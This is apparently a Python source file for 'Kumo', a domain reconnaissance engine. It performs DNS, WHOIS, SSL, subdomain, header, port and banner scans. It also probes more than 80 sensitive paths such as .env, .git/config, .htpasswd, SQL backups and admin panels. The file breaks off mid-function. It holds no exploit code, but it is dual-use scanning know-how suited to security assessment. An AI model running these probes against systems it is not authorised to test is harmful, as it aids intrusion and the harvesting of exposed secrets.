#!/usr/bin/env python3
"""
Kumo v1.0 — Core Recon Engine
All scanning modules, separated from CLI/Web presentation.
"""

import socket
import ssl
import concurrent.futures
import re
import ipaddress
import json
from datetime import datetime
from urllib.parse import quote

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


# ═══════════════════════════════════════════════════════════════
# UTILITIES
# ═══════════════════════════════════════════════════════════════

def clean_domain(d):
    d = d.strip().lower()
    d = re.sub(r'^https?://', '', d)
    d = d.split('/')[0].split(':')[0]
    if not re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+$', d):
        return None
    return d


def req(url, timeout=10, headers=None):
    if not HAS_REQUESTS:
        return None
    h = {"User-Agent": "Kumo/1.0 (Security Research)", "Accept": "*/*"}
    if headers:
        h.update(headers)
    try:
        r = requests.get(url, headers=h, timeout=timeout, verify=True, allow_redirects=True)
        return r if r.status_code == 200 else None
    except Exception:
        return None


def dns_query(domain, qtype):
    r = req(f"https://cloudflare-dns.com/dns-query?name={domain}&type={qtype}",
            headers={"Accept": "application/dns-json"})
    if r:
        try:
            return r.json().get("Answer", [])
        except Exception:
            pass
    return []


def resolve(domain):
    ips = {"v4": [], "v6": []}
    try:
        for r in socket.getaddrinfo(domain, None):
            a = r[4][0]
            try:
                o = ipaddress.ip_address(a)
                bucket = "v4" if o.version == 4 else "v6"
                if a not in ips[bucket]:
                    ips[bucket].append(a)
            except ValueError:
                pass
    except socket.gaierror:
        pass
    return ips


# ═══════════════════════════════════════════════════════════════
# MODULE: DNS
# ═══════════════════════════════════════════════════════════════

def scan_dns(domain):
    """
    Fully parallelized DNS scan.
    All record types, DMARC, and all DKIM selectors fire simultaneously.
    Typical time: ~0.4s instead of 3-5s.
    """
    results = {"ips": {}, "records": {}, "email_security": {}}

    DKIM_SELECTORS = ["default", "google", "selector1", "selector2",
                      "k1", "dkim", "mail", "s1", "s2"]
    TYPE_MAP = {"MX": 15, "NS": 2, "TXT": 16, "SOA": 6, "CNAME": 5, "CAA": 257}

    # Build all tasks to run in parallel:
    # - IP resolve
    # - 6 DNS record types
    # - DMARC TXT
    # - 9 DKIM selector TXT queries
    # Total: 17 parallel requests, all fire at once

    def fetch_record(args):
        qname, qtype, label = args
        return label, dns_query(qname, qtype)

    tasks = []
    # DNS record types
    for qtype in TYPE_MAP:
        tasks.append((domain, qtype, f"rec_{qtype}"))
    # DMARC
    tasks.append((f"_dmarc.{domain}", "TXT", "dmarc"))
    # DKIM selectors — all at once
    for sel in DKIM_SELECTORS:
        tasks.append((f"{sel}._domainkey.{domain}", "TXT", f"dkim_{sel}"))

    # Fire everything in parallel + resolve IPs simultaneously
    raw = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
        ip_future = ex.submit(resolve, domain)
        dns_futures = {ex.submit(fetch_record, t): t for t in tasks}

        results["ips"] = ip_future.result()
        for future in concurrent.futures.as_completed(dns_futures):
            label, answers = future.result()
            raw[label] = answers

    # Parse DNS records
    for qtype, expected in TYPE_MAP.items():
        answers = raw.get(f"rec_{qtype}", [])
        filtered = [a.get("data", "").strip('"').rstrip(".")
                    for a in answers if a.get("type") == expected]
        if filtered:
            results["records"][qtype] = filtered

    # SPF (from TXT)
    txt = results["records"].get("TXT", [])
    has_spf = any("v=spf1" in t for t in txt)
    spf_policy = ""
    if has_spf:
        spf_rec = next(t for t in txt if "v=spf1" in t)
        if "+all" in spf_rec:      spf_policy = "+all (DANGEROUS)"
        elif "~all" in spf_rec:    spf_policy = "~all (softfail)"
        elif "-all" in spf_rec:    spf_policy = "-all (strict)"
        elif "?all" in spf_rec:    spf_policy = "?all (neutral)"
    results["email_security"]["spf"] = {"found": has_spf, "policy": spf_policy}

    # DMARC
    dmarc_rec, dmarc_policy = None, ""
    for a in raw.get("dmarc", []):
        d = a.get("data", "")
        if "dmarc" in d.lower():
            dmarc_rec = d.strip('"')
            if "p=none" in d.lower():        dmarc_policy = "none (not enforcing)"
            elif "p=quarantine" in d.lower(): dmarc_policy = "quarantine"
            elif "p=reject" in d.lower():     dmarc_policy = "reject (strict)"
            break
    results["email_security"]["dmarc"] = {
        "found": dmarc_rec is not None, "record": dmarc_rec, "policy": dmarc_policy
    }

    # DKIM — pick the first selector that returned a key (all were queried in parallel)
    dkim_found, dkim_selector = False, ""
    for sel in DKIM_SELECTORS:
        for a in raw.get(f"dkim_{sel}", []):
            if "p=" in a.get("data", ""):
                dkim_found, dkim_selector = True, sel
                break
        if dkim_found:
            break
    results["email_security"]["dkim"] = {"found": dkim_found, "selector": dkim_selector}

    return results


# ═══════════════════════════════════════════════════════════════
# MODULE: WHOIS
# ═══════════════════════════════════════════════════════════════

def scan_whois(domain):
    results = {}
    r = req(f"https://rdap.org/domain/{domain}", timeout=15)
    if not r:
        return {"error": "RDAP lookup failed"}
    try:
        data = r.json()
        results["domain"] = data.get("ldhName", domain)
        results["status"] = [s.split()[-1] for s in data.get("status", [])[:4]]

        for ev in data.get("events", []):
            act, dt = ev.get("eventAction", ""), ev.get("eventDate", "")[:10]
            if act in ("registration", "expiration", "last changed"):
                results[act.replace(" ", "_")] = dt
                if act == "expiration":
                    try:
                        results["days_until_expiry"] = (datetime.strptime(dt, "%Y-%m-%d") - datetime.now()).days
                    except Exception:
                        pass

        ns = [n.get("ldhName", "") for n in data.get("nameservers", []) if n.get("ldhName")]
        results["nameservers"] = ns

        entities = []
        for ent in data.get("entities", []):
            roles = ent.get("roles", [])
            vcard = ent.get("vcardArray", [None, []])[1] if ent.get("vcardArray") else []
            for item in vcard:
                if item[0] == "fn":
                    entities.append({"role": roles[0] if roles else "unknown", "name": item[3]})
        results["entities"] = entities
        return results
    except Exception as e:
        return {"error": str(e)}


# ═══════════════════════════════════════════════════════════════
# MODULE: SSL
# ═══════════════════════════════════════════════════════════════

def scan_ssl(domain):
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
            s.settimeout(10)
            s.connect((domain, 443))
            cert = s.getpeercert()
            cipher = s.cipher()
            proto = s.version()

        subj = dict(x[0] for x in cert.get("subject", ()))
        iss = dict(x[0] for x in cert.get("issuer", ()))
        sans = [v for t, v in cert.get("subjectAltName", ()) if t == "DNS"]

        days_left = None
        try:
            exp = datetime.strptime(cert.get("notAfter", ""), "%b %d %H:%M:%S %Y %Z")
            days_left = (exp - datetime.now()).days
        except Exception:
            pass

        return {
            "common_name": subj.get("commonName", "N/A"),
            "issuer": iss.get("organizationName", "N/A"),
            "issuer_cn": iss.get("commonName", "N/A"),
            "valid_from": cert.get("notBefore", ""),
            "valid_until": cert.get("notAfter", ""),
            "days_left": days_left,
            "sans": sans,
            "wildcards": [s for s in sans if s.startswith("*.")],
            "serial": cert.get("serialNumber", ""),
            "protocol": proto,
            "cipher": cipher[0] if cipher else "",
            "cipher_bits": cipher[2] if cipher else 0,
        }
    except Exception as e:
        return {"error": str(e)}


# ═══════════════════════════════════════════════════════════════
# MODULE: CRTSH (subdomains)
# ═══════════════════════════════════════════════════════════════

def scan_crtsh(domain):
    r = req(f"https://crt.sh/?q=%.{domain}&output=json", timeout=25)
    if not r:
        return {"subdomains": [], "error": "crt.sh unavailable"}
    try:
        data = r.json()
    except Exception:
        return {"subdomains": [], "error": "parse error"}

    subs = set()
    for entry in data:
        for name in entry.get("name_value", "").split("\n"):
            name = name.strip().lower().lstrip("*.")
            if name and name != domain and name.endswith(f".{domain}"):
                subs.add(name)

    subs = sorted(subs)

    # Resolve top 60
    resolved = []
    def check(sub):
        try:
            r2 = socket.getaddrinfo(sub, None, socket.AF_INET, socket.SOCK_STREAM)
            return {"subdomain": sub, "ip": r2[0][4][0], "alive": True}
        except Exception:
            return {"subdomain": sub, "ip": "-", "alive": False}

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
        resolved = list(ex.map(check, subs[:60]))

    sensitive_prefixes = ["admin", "api", "dev", "staging", "stg", "test", "vpn", "mail", "ftp",
                          "db", "database", "jenkins", "gitlab", "jira", "internal", "intranet",
                          "portal", "grafana", "kibana", "elastic", "mongo", "redis", "backup",
                          "old", "legacy", "beta", "uat", "phpmyadmin", "cpanel", "webmail",
                          "sso", "auth", "login", "docker", "k8s"]
    sensitive = [s for s in subs if s.replace(f".{domain}", "").split(".")[0] in sensitive_prefixes]

    return {"subdomains": subs, "resolved": resolved, "sensitive": sensitive, "total": len(subs)}


# ═══════════════════════════════════════════════════════════════
# MODULE: HEADERS
# ═══════════════════════════════════════════════════════════════

def scan_headers(domain):
    if not HAS_REQUESTS:
        return {"error": "requests required"}

    resp = None
    for scheme in ["https", "http"]:
        try:
            resp = requests.get(f"{scheme}://{domain}", timeout=10, allow_redirects=True,
                                headers={"User-Agent": "Kumo/1.0"})
            break
        except Exception:
            continue
    if not resp:
        return {"error": "cannot connect"}

    h = resp.headers
    checks = {
        "Strict-Transport-Security": ("HSTS — force HTTPS", "high"),
        "Content-Security-Policy": ("CSP — prevent XSS/injection", "high"),
        "X-Frame-Options": ("Clickjacking protection", "medium"),
        "X-Content-Type-Options": ("MIME sniffing prevention", "medium"),
        "Referrer-Policy": ("Referrer leakage control", "medium"),
        "Permissions-Policy": ("Browser feature restrictions", "medium"),
        "X-XSS-Protection": ("Legacy XSS filter", "low"),
        "Cross-Origin-Opener-Policy": ("Browsing context isolation", "low"),
        "Cross-Origin-Resource-Policy": ("Cross-origin resource control", "low"),
        "Cross-Origin-Embedder-Policy": ("Cross-origin embedding control", "low"),
    }

    header_results = []
    passed = 0
    for hdr, (desc, severity) in checks.items():
        val = h.get(hdr)
        present = val is not None
        if present:
            passed += 1
        header_results.append({"header": hdr, "value": val, "present": present, "description": desc, "severity": severity})

    score = (passed / len(checks)) * 100
    grade = "F"
    for threshold, g in [(80, "A"), (60, "B"), (40, "C"), (20, "D")]:
        if score >= threshold:
            grade = g
            break

    disclosure = []
    for hdr_name in ["Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version", "X-Generator"]:
        v = h.get(hdr_name)
        if v:
            disclosure.append({"header": hdr_name, "value": v})

    return {
        "status_code": resp.status_code, "final_url": resp.url, "server": h.get("Server", "Hidden"),
        "headers": header_results, "passed": passed, "total": len(checks),
        "score": score, "grade": grade, "disclosure": disclosure,
    }


# ═══════════════════════════════════════════════════════════════
# MODULE: PORTS
# ═══════════════════════════════════════════════════════════════

def scan_ports(domain, extra_ports=None):
    """
    Scan common ports + any extras discovered by Shodan/Censys (passed in via extra_ports).
    Ports sourced from extra_ports are tagged with their origin.
    """
    # ── Comprehensive port list (researched: most common on public web services) ──
    KNOWN_PORTS = {
        # Web
        80:    ("HTTP",              "low"),
        81:    ("HTTP-Alt",          "low"),
        443:   ("HTTPS",             "low"),
        444:   ("HTTPS-Alt",         "low"),
        591:   ("FileMaker HTTP",    "low"),
        2082:  ("cPanel HTTP",       "medium"),
        2083:  ("cPanel HTTPS",      "medium"),
        2086:  ("WHM HTTP",          "medium"),
        2087:  ("WHM HTTPS",         "medium"),
        2095:  ("Webmail HTTP",      "medium"),
        2096:  ("Webmail HTTPS",     "medium"),
        7080:  ("HTTP-Alt",          "low"),
        8000:  ("HTTP-Dev",          "low"),
        8008:  ("HTTP-Alt",          "low"),
        8080:  ("HTTP-Proxy/Alt",    "low"),
        8081:  ("HTTP-Alt",          "low"),
        8443:  ("HTTPS-Alt",         "low"),
        8888:  ("HTTP-Dev",          "low"),
        9000:  ("HTTP-Alt/PHP-FPM",  "medium"),
        9443:  ("HTTPS-Alt",         "low"),
        10000: ("Webmin",            "high"),
        # Email
        25:    ("SMTP",              "low"),
        465:   ("SMTPS",             "low"),
        587:   ("SMTP/TLS",          "low"),
        110:   ("POP3",              "medium"),
        995:   ("POP3S",             "low"),
        143:   ("IMAP",              "medium"),
        993:   ("IMAPS",             "low"),
        # Remote access
        22:    ("SSH",               "medium"),
        23:    ("Telnet",            "critical"),
        3389:  ("RDP",               "high"),
        5900:  ("VNC",               "high"),
        5901:  ("VNC-1",             "high"),
        5902:  ("VNC-2",             "high"),
        # File transfer
        21:    ("FTP",               "high"),
        990:   ("FTPS",              "medium"),
        69:    ("TFTP",              "high"),
        115:   ("SFTP",              "medium"),
        # DNS
        53:    ("DNS",               "low"),
        # Databases (should NEVER be public)
        1433:  ("MSSQL",             "critical"),
        1521:  ("Oracle DB",         "critical"),
        3306:  ("MySQL",             "critical"),
        5432:  ("PostgreSQL",        "critical"),
        5984:  ("CouchDB",           "critical"),
        6379:  ("Redis",             "critical"),
        7474:  ("Neo4j",             "critical"),
        9042:  ("Cassandra",         "critical"),
        9200:  ("Elasticsearch",     "critical"),
        9300:  ("Elasticsearch TCP", "critical"),
        27017: ("MongoDB",           "critical"),
        27018: ("MongoDB Shard",     "critical"),
        28017: ("MongoDB HTTP",      "critical"),
        # File sharing / SMB
        139:   ("NetBIOS",           "critical"),
        445:   ("SMB",               "critical"),
        2049:  ("NFS",               "critical"),
        # Monitoring / DevOps (often exposed accidentally)
        2375:  ("Docker API (HTTP)", "critical"),
        2376:  ("Docker API (TLS)",  "high"),
        2379:  ("etcd",              "critical"),
        2380:  ("etcd Peer",         "critical"),
        4243:  ("Docker Alt",        "critical"),
        4848:  ("GlassFish Admin",   "critical"),
        4200:  ("CockroachDB Admin", "critical"),
        5601:  ("Kibana",            "high"),
        6443:  ("Kubernetes API",    "critical"),
        8001:  ("Kubernetes Alt",    "high"),
        8500:  ("Consul HTTP",       "critical"),
        8600:  ("Consul DNS",        "high"),
        9090:  ("Prometheus",        "high"),
        9091:  ("Prometheus Push",   "high"),
        9100:  ("Prometheus Node",   "high"),
        9093:  ("Alertmanager",      "high"),
        9094:  ("Alertmanager Alt",  "high"),
        9411:  ("Zipkin",            "medium"),
        16686: ("Jaeger UI",         "medium"),
        # Other services
        389:   ("LDAP",              "high"),
        636:   ("LDAPS",             "high"),
        3000:  ("Grafana/Node Dev",  "medium"),
        4000:  ("Dev Server",        "medium"),
        4567:  ("Sinatra/Dev",       "medium"),
        5000:  ("Dev Server/UPnP",   "medium"),
        5555:  ("ADB/Dev",           "high"),
        8161:  ("ActiveMQ Admin",    "critical"),
        8181:  ("HTTP-Alt",          "low"),
        8983:  ("Apache Solr",       "high"),
        11211: ("Memcached",         "critical"),
        15672: ("RabbitMQ Mgmt",     "high"),
        61616: ("ActiveMQ",          "high"),
    }

    # Merge with extra ports from Shodan/Censys intelligence
    ports_to_scan = dict(KNOWN_PORTS)
    shodan_censys_ports = set(extra_ports or [])
    for p in shodan_censys_ports:
        if p not in ports_to_scan:
            ports_to_scan[p] = ("Unknown (Shodan/Censys)", "medium")

    def scan_one(item):
        port, (svc, risk) = item
        source = "shodan_censys" if port in shodan_censys_ports and port not in KNOWN_PORTS else "scan"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            result = s.connect_ex((domain, port))
            if result == 0:
                # Port is open — try to grab banner
                banner = ""
                try:
                    s.settimeout(2)
                    # Send probe appropriate to service type
                    if port in (80, 8080, 8000, 8008, 8081, 8888):
                        s.send(b"HEAD / HTTP/1.0\r\nHost: " + domain.encode() + b"\r\n\r\n")
                    elif port in (443, 8443, 9443, 4443):
                        pass  # TLS — can't banner without handshake via raw socket
                    elif port == 21:
                        pass   # FTP sends banner on connect
                    elif port == 25:
                        s.send(b"EHLO kumo\r\n")
                    elif port == 22:
                        pass   # SSH sends banner on connect
                    raw = s.recv(512)
                    banner = raw.decode("utf-8", errors="replace").strip()[:200]
                    # Extract version-like strings for key protocols
                    banner = banner.replace("\r\n", " | ").replace("\n", " | ")
                except Exception:
                    pass
                s.close()
                return {
                    "port":    port,
                    "service": svc,
                    "risk":    risk,
                    "open":    True,
                    "source":  source,
                    "banner":  banner,
                    "version": _extract_version(banner, svc),
                }
            s.close()
            return {"port": port, "service": svc, "risk": risk, "open": False, "source": source, "banner": "", "version": ""}
        except Exception:
            return {"port": port, "service": svc, "risk": risk, "open": False, "source": source, "banner": "", "version": ""}

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
        results = sorted(ex.map(scan_one, ports_to_scan.items()), key=lambda x: x["port"])

    open_ports = [r for r in results if r["open"]]
    return {
        "results":       results,
        "open":          open_ports,
        "total_scanned": len(ports_to_scan),
        "from_intel":    len(shodan_censys_ports),
    }


def _extract_version(banner, service):
    """Extract software name + version from a service banner string."""
    if not banner:
        return ""
    import re as _re
    patterns = [
        # SSH: "SSH-2.0-OpenSSH_8.2p1"
        (_re.search(r'SSH-[\d.]+-(\S+)', banner), lambda m: m.group(1)),
        # HTTP Server header: "Server: Apache/2.4.41"
        (_re.search(r'Server:\s*([^\s|]+)', banner, _re.I), lambda m: m.group(1)[:60]),
        # FTP: "220 ProFTPD 1.3.5e"
        (_re.search(r'220[- ](.+?)(?:\s*\||\s*$)', banner), lambda m: m.group(1)[:60]),
        # SMTP: "220 mail.example.com ESMTP Postfix"
        (_re.search(r'ESMTP\s+(\S+)', banner, _re.I), lambda m: "SMTP/" + m.group(1)),
        # Generic: "nginx/1.18.0" or "Apache/2.4.41"
        (_re.search(r'(nginx|apache|lighttpd|iis|tomcat|jetty|gunicorn|uwsgi|caddy)[/\s]+([\d.]+)', banner, _re.I),
         lambda m: f"{m.group(1)}/{m.group(2)}"),
        # MySQL: "5.7.32-log"
        (_re.search(r'(\d+\.\d+\.\d+[^\s|]*)', banner), lambda m: m.group(1)[:30]),
    ]
    for match, extractor in patterns:
        if match:
            try:
                return extractor(match)
            except Exception:
                pass
    # Fallback: return first meaningful word
    words = banner.split()
    if words and len(words[0]) > 2:
        return words[0][:40]
    return ""


# ═══════════════════════════════════════════════════════════════
# MODULE: TECH
# ═══════════════════════════════════════════════════════════════

def scan_tech(domain):
    if not HAS_REQUESTS:
        return {"error": "requests required"}

    resp = None
    for scheme in ["https", "http"]:
        try:
            resp = requests.get(f"{scheme}://{domain}", timeout=10, allow_redirects=True,
                                headers={"User-Agent": "Kumo/1.0"})
            break
        except Exception:
            continue
    if not resp:
        return {"error": "cannot connect"}

    body = resp.text[:80000]
    hdrs = str(resp.headers).lower()
    combined = body + hdrs
    detected = {}

    categories = {
        "CMS": {"WordPress": [r'wp-content', r'wp-includes'], "Drupal": [r'Drupal', r'sites/default/files'],
                 "Joomla": [r'/media/jui/'], "Shopify": [r'cdn\.shopify\.com'], "Wix": [r'wix\.com'],
                 "Squarespace": [r'squarespace\.com'], "Webflow": [r'webflow\.com'], "Magento": [r'Magento']},
        "Frontend": {"React": [r'react\.production', r'react-dom'], "Vue.js": [r'vue\.js', r'Vue\.component'],
                     "Angular": [r'ng-app', r'ng-version'], "jQuery": [r'jquery'], "Next.js": [r'__NEXT_DATA__'],
                     "Nuxt.js": [r'__NUXT__'], "Bootstrap": [r'bootstrap\.min'], "Tailwind": [r'tailwindcss']},
        "CDN": {"Cloudflare": [r'cloudflare', r'cf-ray'], "AWS CloudFront": [r'cloudfront\.net'],
                "Fastly": [r'fastly'], "Vercel": [r'vercel'], "Netlify": [r'netlify']},
        "Analytics": {"Google Analytics": [r'google-analytics\.com', r'gtag\('], "Facebook Pixel": [r'connect\.facebook\.net'],
                      "Hotjar": [r'hotjar\.com'], "Segment": [r'segment\.com']},
        "Security": {"Cloudflare WAF": [r'cf-ray'], "reCAPTCHA": [r'recaptcha'], "hCaptcha": [r'hcaptcha\.com'],
                     "Sucuri WAF": [r'sucuri'], "Imperva": [r'incapsula']},
    }

    for cat, techs in categories.items():
        found = []
        for name, patterns in techs.items():
            for p in patterns:
                if re.search(p, combined, re.IGNORECASE):
                    found.append(name); break
        if found:
            detected[cat] = found

    srv = resp.headers.get("Server", "")
    if srv:
        detected["Server"] = [srv]
    pb = resp.headers.get("X-Powered-By", "")
    if pb:
        detected["Runtime"] = [pb]

    return detected


# ═══════════════════════════════════════════════════════════════
# MODULE: GEO
# ═══════════════════════════════════════════════════════════════

def scan_geo(domain):
    ips = resolve(domain)
    if not ips["v4"]:
        return {"error": "cannot resolve"}
    ip = ips["v4"][0]
    r = req(f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,hosting")
    if not r:
        return {"error": "geo API unreachable"}
    try:
        d = r.json()
        if d.get("status") != "success":
            return {"error": "lookup failed"}
        return {
            "ip": ip, "hostname": d.get("reverse", ""), "country": d.get("country", ""),
            "country_code": d.get("countryCode", ""),
            "flag": "".join(chr(0x1F1E6+ord(c)-ord('A')) for c in (d.get("countryCode","") or "").upper() if c.isalpha()) if len((d.get("countryCode","") or ""))==2 else "",
            "region": d.get("regionName", ""),
            "city": d.get("city", ""), "lat": d.get("lat"), "lon": d.get("lon"),
            "timezone": d.get("timezone", ""), "isp": d.get("isp", ""),
            "org": d.get("org", ""), "asn": d.get("as", ""),
            "is_hosting": d.get("hosting", False),
        }
    except Exception:
        return {"error": "parse error"}


# ═══════════════════════════════════════════════════════════════
# MODULE: ROBOTS
# ═══════════════════════════════════════════════════════════════

def scan_robots(domain):
    results = {"robots": None, "security_txt": None, "sitemaps": []}
    if not HAS_REQUESTS:
        return results

    try:
        r = requests.get(f"https://{domain}/robots.txt", timeout=10, headers={"User-Agent": "Kumo/1.0"})
        if r.status_code == 200 and r.text.strip():
            disallowed = []
            sitemaps = []
            sensitive_kw = ["admin", "login", "api", "config", "backup", "db", "private", "secret",
                            "internal", "panel", "dashboard", "wp-admin", "cpanel", "phpmyadmin",
                            ".env", ".git", "debug", "cgi-bin", "server-status", "xmlrpc"]
            allowed   = []
            skip_ext  = ('.css','.js','.png','.jpg','.jpeg','.gif','.svg','.ico','.woff','.woff2','.ttf','.eot','.map')
            for line in r.text.strip().split("\n"):
                line = line.strip()
                ll = line.lower()
                if ll.startswith("disallow:"):
                    path = line.split(":", 1)[1].strip()
                    if path and not any(path.lower().endswith(e) for e in skip_ext):
                        is_sensitive = any(k in path.lower() for k in sensitive_kw)
                        disallowed.append({"path": path, "sensitive": is_sensitive})
                elif ll.startswith("allow:"):
                    path = line.split(":", 1)[1].strip()
                    if path and path != "/" and not any(path.lower().endswith(e) for e in skip_ext):
                        allowed.append({"path": path, "interesting": any(k in path.lower() for k in sensitive_kw)})
                elif ll.startswith("sitemap:"):
                    sitemaps.append(line[line.lower().index("sitemap:") + 8:].strip())
            results["robots"] = {"disallowed": disallowed, "allowed": allowed, "count": len(disallowed)}
            results["sitemaps"] = sitemaps
    except Exception:
        pass

    for path in ["/.well-known/security.txt", "/security.txt"]:
        try:
            r = requests.get(f"https://{domain}{path}", timeout=8, headers={"User-Agent": "Kumo/1.0"})
            if r.status_code == 200 and "contact" in r.text.lower():
                results["security_txt"] = {"path": path, "content": r.text[:500]}
                break
        except Exception:
            pass

    return results


# ═══════════════════════════════════════════════════════════════
# MODULE: SENSITIVE ENDPOINTS (50+ known paths)
# ═══════════════════════════════════════════════════════════════

def scan_endpoints(domain):
    """
    Probe 55+ well-known sensitive endpoints across categories:
    admin panels, config files, debug interfaces, API docs,
    frameworks, cloud metadata, CI/CD, monitoring, backups.
    Returns only those that respond (not 404).
    """
    if not HAS_REQUESTS:
        return {"error": "requests required"}

    ENDPOINTS = [
        # ── Admin & Login panels ──
        ("/admin/",                    "Admin Panel",          "high"),
        ("/admin/login",               "Admin Login",          "high"),
        ("/administrator/",            "Administrator Panel",  "high"),
        ("/wp-admin/",                 "WordPress Admin",      "high"),
        ("/wp-login.php",              "WordPress Login",      "medium"),
        ("/phpmyadmin/",               "phpMyAdmin",           "critical"),
        ("/phpmyadmin/index.php",      "phpMyAdmin Index",     "critical"),
        ("/adminer.php",               "Adminer DB Tool",      "critical"),
        ("/adminer/",                  "Adminer DB Tool",      "critical"),
        ("/pma/",                      "phpMyAdmin (pma)",     "critical"),
        ("/cpanel/",                   "cPanel",               "critical"),
        ("/webmail/",                  "Webmail",              "medium"),
        ("/manager/html",              "Tomcat Manager",       "critical"),
        ("/manager/status",            "Tomcat Status",        "high"),
        ("/jenkins/",                  "Jenkins CI",           "high"),
        ("/jenkins/login",             "Jenkins Login",        "high"),
        ("/grafana/",                  "Grafana Dashboard",    "high"),
        ("/kibana/",                   "Kibana Dashboard",     "high"),
        ("/solr/",                     "Apache Solr",          "high"),
        # ── Config & Secrets ──
        ("/.env",                      ".env File",            "critical"),
        ("/.env.local",                ".env.local",           "critical"),
        ("/.env.production",           ".env.production",      "critical"),
        ("/.env.backup",               ".env.backup",          "critical"),
        ("/config.php",                "config.php",           "critical"),
        ("/configuration.php",         "Joomla Config",        "critical"),
        ("/wp-config.php.bak",         "WP Config Backup",     "critical"),
        ("/wp-config.php~",            "WP Config Backup ~",   "critical"),
        ("/database.yml",              "Rails DB Config",      "critical"),
        ("/application.yml",           "App Config YAML",      "high"),
        ("/settings.py",               "Django Settings",      "high"),
        ("/config.json",               "config.json",          "high"),
        ("/config.xml",                "config.xml",           "medium"),
        # ── Source Control ──
        ("/.git/config",               ".git Config",          "critical"),
        ("/.git/HEAD",                 ".git HEAD",            "critical"),
        ("/.git/COMMIT_EDITMSG",       ".git Commit Msg",      "high"),
        ("/.svn/entries",              "SVN Entries",          "high"),
        ("/.hg/",                      "Mercurial Repo",       "high"),
        # ── Backups & Dumps ──
        ("/backup.sql",                "SQL Backup",           "critical"),
        ("/dump.sql",                  "SQL Dump",             "critical"),
        ("/backup.zip",                "Backup ZIP",           "critical"),
        ("/backup.tar.gz",             "Backup TAR",           "critical"),
        ("/db.sqlite",                 "SQLite DB",            "critical"),
        ("/database.sql",              "Database SQL",         "critical"),
        # ── Debug & Info ──
        ("/phpinfo.php",               "phpinfo()",            "high"),
        ("/info.php",                  "phpinfo (info.php)",   "high"),
        ("/test.php",                  "test.php",             "medium"),
        ("/server-status",             "Apache server-status", "medium"),
        ("/server-info",               "Apache server-info",   "medium"),
        ("/_profiler/",                "Symfony Profiler",     "high"),
        ("/debug/",                    "Debug Endpoint",       "high"),
        ("/trace",                     "Trace Endpoint",       "medium"),
        # ── API & Documentation ──
        ("/api/",                      "API Root",             "info"),
        ("/api/v1/",                   "API v1",               "info"),
        ("/api/v2/",                   "API v2",               "info"),
        ("/graphql",                   "GraphQL Endpoint",     "medium"),
        ("/graphiql",                  "GraphiQL IDE",         "high"),
        ("/swagger-ui.html",           "Swagger UI",           "medium"),
        ("/swagger-ui/",               "Swagger UI Alt",       "medium"),
        ("/api-docs",                  "OpenAPI Docs",         "medium"),
        ("/api-docs.json",             "OpenAPI JSON",         "medium"),
        ("/.well-known/openid-configuration", "OIDC Config",  "info"),
        ("/.well-known/jwks.json",     "JWKS (JWT Keys)",      "medium"),
        # ── Cloud / Infrastructure ──
        ("/actuator",                  "Spring Actuator",      "high"),
        ("/actuator/env",              "Spring Actuator /env", "critical"),
        ("/actuator/health",           "Spring Actuator Health","info"),
        ("/actuator/metrics",          "Spring Actuator Metrics","medium"),
        ("/actuator/beans",            "Spring Actuator Beans","medium"),
        ("/actuator/mappings",         "Spring Actuator Maps", "medium"),
        ("/health",                    "Health Check",         "info"),
        ("/metrics",                   "Metrics Endpoint",     "medium"),
        ("/status",                    "Status Page",          "info"),
        # ── Miscellaneous known paths ──
        ("/xmlrpc.php",                "XML-RPC (WP)",         "medium"),
        ("/crossdomain.xml",           "crossdomain.xml",      "low"),
        ("/clientaccesspolicy.xml",    "Client Access Policy", "low"),
        ("/.DS_Store",                 ".DS_Store (macOS)",    "medium"),
        ("/Thumbs.db",                 "Thumbs.db",            "low"),
        ("/web.config",                "IIS web.config",       "high"),
        ("/WEB-INF/web.xml",           "Java WEB-INF",         "critical"),
        ("/docker-compose.yml",        "Docker Compose",       "high"),
        ("/Dockerfile",                "Dockerfile",           "medium"),
        ("/.htpasswd",                 ".htpasswd",            "critical"),
        ("/.htaccess",                 ".htaccess",            "medium"),
    ]

    sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}

    def probe(item):
        path, name, severity = item
        for scheme in ["https", "http"]:
            try:
                r = requests.get(
                    f"{scheme}://{domain}{path}",
                    timeout=5, allow_redirects=False,
                    headers={"User-Agent": "Kumo/1.0"},
                    verify=False,
                )
                if r.status_code not in (404, 410, 400, 501):
                    content_len = len(r.content)
                    if r.status_code in (200, 403, 500) and content_len > 0:
                        sev = severity
                        if r.status_code == 403:
                            sev = {"critical":"high","high":"medium","medium":"low","low":"info","info":"info"}.get(severity, severity)
                        return {
                            "path":         path,
                            "name":         name + (" [403 Forbidden]" if r.status_code == 403 else ""),
                            "severity":     sev,
                            "status":       r.status_code,
                            "size":         content_len,
                            "url":          f"{scheme}://{domain}{path}",
                            "content_type": r.headers.get("Content-Type", "")[:40],
                        }
                break
            except Exception:
                break
        return None

    try:
        import urllib3
        urllib3.disable_warnings()
    except Exception:
        pass

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
        raw = list(ex.map(probe, ENDPOINTS))

    found = sorted(
        [r for r in raw if r is not None],
        key=lambda x: (sev_order.get(x["severity"], 99), x["path"])
    )

    counts = {}
    for f in found:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1

    return {
        "total_probed":    len(ENDPOINTS),
        "total_found":     len(found),
        "severity_counts": counts,
        "findings":        found,
    }


# ═══════════════════════════════════════════════════════════════
# MODULE: SCREENSHOT (playwright → requests fallback)
# ═══════════════════════════════════════════════════════════════

def scan_screenshot(domain):
    """
    Site overview card:
    - thum.io screenshot (browser-rendered)
    - Page title + meta description
    - Favicon URL
    - Ransomware feed check (ransomware.live v2 API — no key needed, set RANSOMWARE_LIVE_API_KEY for pro)
    - Threat feed mentions (URLhaus, VirusTotal public)
    """
    import shutil

    result = {
        "method":        "thumio",
        "url":           f"https://{domain}",
